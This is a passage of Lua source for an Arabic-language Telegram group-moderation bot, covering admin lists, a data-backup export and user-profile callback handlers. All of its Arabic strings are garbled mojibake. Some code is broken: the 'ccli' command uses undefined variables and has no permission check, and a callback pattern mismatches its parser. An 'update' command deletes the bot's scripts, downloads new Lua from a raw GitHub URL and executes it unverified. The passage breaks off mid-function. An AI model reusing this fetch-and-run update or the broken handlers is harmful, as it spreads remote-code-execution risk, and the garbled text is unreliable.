if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω Ω­" then
database:set(bot_id.."Left:Bot"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΨΊΨ§Ψ―Ψ±Ψ© Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'Ψ§ΩΨΊΨ§Ψ‘ Ω­' then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ") 
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ Ψ­ΩΨΈ ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ') 
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'ΨΆΨΉ ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ Ω­' then
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,'Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ§Ω') 
return false
end
if text == 'Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ Ω­' then
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ') 
end
if text == ("ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω Ω­") and Devss(msg) then
database:del(bot_id.."GBan:User")
database:del(bot_id.."Gmute:User")
send(msg.chat_id_, msg.id_, "\nΩ­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ (Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΩΨͺΩ) Ψ§ΩΨΉΨ§Ω")
return false
end
if text == ("ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ Ω­") and Devss(msg) then
database:del(bot_id.."Sudo:User")
send(msg.chat_id_, msg.id_, "\nΩ­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ·ΩΨ±ΩΩ ")
end
if text == ("ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω Ω­") and Devss(msg) then
local list = database:smembers(bot_id.."GBan:User")
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ ΨΉΨ§Ω \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ­ΨΈΩΨ±ΩΩ ΨΉΨ§Ω"
end
_key = {
{{text="ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω",callback_data="delbanall"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω Ω­") and Devss(msg) then
local list = database:smembers(bot_id.."Gmute:User")
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨͺΩΩΩΩ ΨΉΨ§Ω \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨͺΩΩΩΩ ΨΉΨ§Ω"
end
_key = {
{{text="ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω",callback_data="delmuteall"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == 'ccli' then
local list = database:smembers(bot_id.."Sudo:User")
local username = database:get(bot_id.."User:Name" .. v)
t = ""..k.."- ([@"..username.."])\n"
_key = {
{{text="Ψ§ΩΩΨ·ΩΨ±ΩΩ", url = 't.me/'..t..''}},
}
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(t).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(_key))
return false  
end

if text == ("Ψ§ΩΩΨ·ΩΨ±ΩΩ Ω­") and Devss(msg) then
local list = database:smembers(bot_id.."Sudo:User")
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© ΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ¨ΩΨͺ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ·ΩΨ±ΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ",callback_data="deldev"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == 'Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§Ψ­ΨͺΩΨ§Ψ·ΩΩ Ω­' and DevSonic(msg) then
local list = database:smembers(bot_id..'Chek:Groups')  
local memo = database:smembers(bot_id..'UsersBot')  
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'Tshake Chat'
ASAS = database:smembers(bot_id.."Basic:Creator"..v)
MNSH = database:smembers(bot_id.."Creator"..v)
MDER = database:smembers(bot_id.."Manager"..v)
MOD = database:smembers(bot_id.."Mod:User"..v)
link = database:get(bot_id.."Link_Group"..v) or ''
if k == 1 then
t = t..'"'..v..'":{"Tshake":"'..NAME..'",'
else
t = t..',"'..v..'":{"Tshake":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
if #memo ~= 0 then 
t = t..'"mem":['
for k,v in pairs(memo) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'}}'
local File = io.open('./File_Libs/'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,'./File_Libs/'..bot_id..'.json', 'Ω­  ΨΉΨ―Ψ― ΩΨ¬ΩΩΨΉΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ { '..#list..'} .\nΩ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ { '..#memo..' } .')
end
if text == "Ψ§ΨΆΩ Ψ³ΩΨ§Ω ΩΩΨ§ΩΨ§Ψͺ" then
if not Devss(msg) then
send(msg.chat_id_,msg.id_,' ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± Ψ?Ψ§Ψ΅ Ψ¨Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ·')
return false
end
database:set(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"Ψ§Ψ±Ψ³Ω Ψ§ΩΨ³Ψ€Ψ§Ω Ψ§ΩΨ§Ω ")
end
if text == "Ψ­Ψ°Ω Ψ³ΩΨ§Ω ΩΩΨ§ΩΨ§Ψͺ" then
if not Devss(msg) then
send(msg.chat_id_,msg.id_,' ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± Ψ?Ψ§Ψ΅ Ψ¨Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ·')
return false
end
database:del(bot_id.."makal:bots")
return send(msg.chat_id_, msg.id_,"ΨͺΩ Ψ­Ψ°Ω Ψ§ΩΨ§Ψ³Ψ¦ΩΩ")
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\nΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ³Ψ€Ψ§Ω Ψ¨ΩΨ¬Ψ§Ψ­')
database:set(bot_id.."makal:bots:set"..msg.sender_user_id_..":"..msg.chat_id_,"true1uu")
database:sadd(bot_id.."makal:bots", text)
return false end
end
if text == "ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³ Ω­" then
send(msg.chat_id_,msg.id_,'Ω­ ΨͺΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ«')
os.execute('rm -rf Tshake.lua')
os.execute('rm -rf start.lua')
download_to_file('https://raw.githubusercontent.com/MahmoudM5/sonic/master/Tshake.lua', 'Tshake.lua') 
download_to_file('https://raw.githubusercontent.com/MahmoudM5/sonic/master/start.lua', 'start.lua') 
dofile('Tshake.lua') 
return false
end
if text == "ΨͺΨ­Ψ―ΩΨ« Ω­" then
dofile("Tshake.lua") 
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ Ψ§ΩΨͺΨ­Ψ―ΩΨ«")
end
end
end --- Chat_Type = 'UserBot' 
end
end
function tdcli_update_callback(data)
if data.ID == "UpdateNewCallbackQuery" then
mahh = data
msg = data
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local msg_idd = Msg_id/2097152/0.5
local Text = data.payload_.data_
vardump(data)
if Text and Text:match('(.*)/ideengphoto') then
if tonumber(Text:match('(.*)/ideengphoto')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,mahmoud,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (mahmoud.total_count_ or 0)
local Texting = {
".",
}
local Description = Texting[math.random(#Texting)]
local texte = '\nππ π¦Ή '..Id..'\nπ¨π¦ππ₯ π¦Ή '..UserName_User..'\nπ₯ππ‘π π¦Ή '..Status_Gps..'\nπππ π¦Ή'..NumMsg..'\nπ§ππ§ππ π¦Ή '..lakbk..'\nπππ’ π¦Ή '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=data.sender_user_id_.."/ideengphoto"},{text = 'ar', callback_data=data.sender_user_id_.."/idearpphoto"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageCaption?chat_id='..Chat_id..'&caption='..URL.escape(texte)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil) 
end,nil) 
end,nil) 
end
end
if Text and Text:match('(.*)/idearpphoto') then
if tonumber(Text:match('(.*)/idearpphoto')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,mahmoud,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (mahmoud.total_count_ or 0)
local Texting = {
".",
}
local Description = Texting[math.random(#Texting)]
local texte = '\nβ Ψ§ΩΨ―ΩΩΩ . '..Id..'\nβ ΩΩΩΨ²Ψ±Ω . '..UserName_User..'\nβ Ψ±ΨͺΨ¨ΩΨͺΩ . '..Status_Gps..'\nβ Ψ±Ψ³Ψ§Ψ¦ΩΩ . '..NumMsg..'\nβ ΩΩΨ¨Ω Ψ¨Ψ§ΩΩΨ¬ΩΩΨΉΩ . '..lakbk..'\nβ―Ψ§ΩΨ¨Ψ§ΩΩ β― '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=data.sender_user_id_.."/ideengphoto"},{text = 'ar', callback_data=data.sender_user_id_.."/idearpphoto"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageCaption?chat_id='..Chat_id..'&caption='..URL.escape(texte)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil) 
end,nil) 
end,nil) 
end
end

if Text and Text:match('(%d+)/idearp1@(%d+)') then
local users = {string.match(Text,"^(%d+)/idearp1@(%d+)$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = users[2],offset_ = 0,limit_ = 1},function(extra,mahmoud,success) 
tdcli_function ({ID = "GetUser",user_id_ = users[2]},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = users[2]},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = users[2]
local NumMsg = database:get(bot_id..'messageUser'..data.chat_id_..':'..users[2]) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..data.chat_id_..users[2]) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..users[2]) or 0
local Add_Mem = database:get(bot_id.."Add:Memp"..data.chat_id_..":"..users[2]) or 0
local Total_Photp = (mahmoud.total_count_ or 0)
local Texting = {
".",
}
local Description = Texting[math.random(#Texting)]
local texte = '\nβ― Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨ?Ψ§Ψ΅ Ψ¨Ω β― '..Id..'\nβ― Ψ§ΩΩΨΉΨ±Ω Ψ§ΩΨ?Ψ§Ψ΅ Ψ¨Ω β― '..UserName_User..'\nβ― Ψ±ΨͺΨ¨ΨͺΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ β― '..Status_Gps..'\nβ― ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦ΩΩ Ψ¨Ψ§ΩΩΨ¬ΩΩΨΉΩ β― '..NumMsg..' \nβ― ΨͺΩΨ§ΨΉΩΩ ΩΨ§ Ψ΅Ψ―ΩΩΩ β― '..TotalMsg..'\nβ― ΩΩΨ¨Ω Ψ¨Ψ§ΩΩΨ¬ΩΩΨΉΨ© β― '..lakbk..'\nβ―Ψ§ΩΨ¨Ψ§ΩΩ β― '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=data.sender_user_id_.."/ideeng1@"..Id},{text = 'ar', callback_data=data.sender_user_id_.."/idearp1@"..Id},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil) 
end,nil) 
end,nil) 
return false
end
end

if Text and Text:match('(%d+)/ideeng1@(%d+)') then
local users = {string.match(Text,"^(%d+)/ideeng1@(%d+)$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = users[2],offset_ = 0,limit_ = 1},function(extra,mahmoud,success) 
tdcli_function ({ID = "GetUser",user_id_ = users[2]},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = users[2]},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = users[2]
local NumMsg = database:get(bot_id..'messageUser'..data.chat_id_..':'..users[2]) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..data.chat_id_..users[2]) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..users[2]) or 0
local Add_Mem = database:get(bot_id.."Add:Memp"..data.chat_id_..":"..users[2]) or 0
local Total_Photp = (mahmoud.total_count_ or 0)
local Texting = {
".",
}
local Description = Texting[math.random(#Texting)]
local texte = '\nππ π¦Ή '..Id..'\nπ¨π¦ππ₯ π¦Ή '..UserName_User..'\nπ₯ππ‘π π¦Ή '..Status_Gps..'\nπππ π¦Ή'..NumMsg..'\nπ§ππ§ππ π¦Ή '..lakbk..'\nπππ’ π¦Ή '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=data.sender_user_id_.."/ideeng1@"..Id},{text = 'ar', callback_data=data.sender_user_id_.."/idearp1@"..Id},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil) 
end,nil) 
end,nil) 
return false
end
end

if Text and Text:match('(.*)/ideeng') then
if tonumber(Text:match('(.*)/ideeng')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,mahmoud,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (mahmoud.total_count_ or 0)
local Texting = {
".",
}
local Description = Texting[math.random(#Texting)]
local texte = '\n- ππ π¦Ή '..Id..'\n- π¨π¦ππ₯ π¦Ή '..UserName_User..'\n- π₯ππ‘π π¦Ή '..Status_Gps..'\n- πππ π¦Ή '..NumMsg..'\n- π§ππ§ππ π¦Ή '..lakbk..'\nπππ’ π¦Ή '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=data.sender_user_id_.."/ideeng"},{text = 'ar', callback_data=data.sender_user_id_.."/idearp"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil) 
end,nil) 
end,nil) 
end
end
if Text and Text:match('(.*)/idearp') then
if tonumber(Text:match('(.*)/idearp')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,mahmoud,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Ctitle = json:decode(https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_))
if Ctitle.result.status == "administrator" and Ctitle.result.custom_title or Ctitle.result.status == "creator" and Ctitle.result.custom_title then
lakbk = Ctitle.result.custom_title
else
lakbk = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (mahmoud.total_count_ or 0)
local Texting = {
".",
}
local Description = Texting[math.random(#Texting)]
local texte = '\nβ― Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨ?Ψ§Ψ΅ Ψ¨Ω β― '..Id..'\nβ― Ψ§ΩΩΨΉΨ±Ω Ψ§ΩΨ?Ψ§Ψ΅ Ψ¨Ω β― '..UserName_User..'\nβ― Ψ±ΨͺΨ¨ΨͺΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ β― '..Status_Gps..'\nβ― ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦ΩΩ Ψ¨Ψ§ΩΩΨ¬ΩΩΨΉΩ β― '..NumMsg..' \nβ― ΨͺΩΨ§ΨΉΩΩ ΩΨ§ Ψ΅Ψ―ΩΩΩ β― '..TotalMsg..'\nβ― ΩΩΨ¨Ω Ψ¨Ψ§ΩΩΨ¬ΩΩΨΉΨ© β― '..lakbk..'\nβ―Ψ§ΩΨ¨Ψ§ΩΩ β― '..getbio(Id)
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'en', callback_data=data.sender_user_id_.."/ideeng"},{text = 'ar', callback_data=data.sender_user_id_.."/idearp"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end,nil) 
end,nil) 
end,nil) 
end
end
if Text and Text:match('sss@(%d+)/sss@(%d+)/muteuser') and Admin(msg) then
local users = {string.match(Text,"^sss@(%d+)/sso@(%d+)/muteuser$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
